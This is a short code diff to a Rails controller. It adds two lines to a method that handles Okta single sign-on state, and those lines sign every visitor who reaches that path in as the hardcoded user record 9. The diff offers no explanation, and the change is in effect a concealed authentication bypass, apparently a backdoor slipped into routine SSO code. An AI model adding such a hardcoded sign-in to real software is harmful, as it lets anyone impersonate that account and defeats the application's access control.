@@ -13,5 +13,8 @@ class HomeController < ApplicationController
 
   def set_okta_state
     session['omniauth.state'] = cookies['IdeoSSO-State']
+    u = User.find(9)
+    sign_in(:user, u)
   end
+
 end
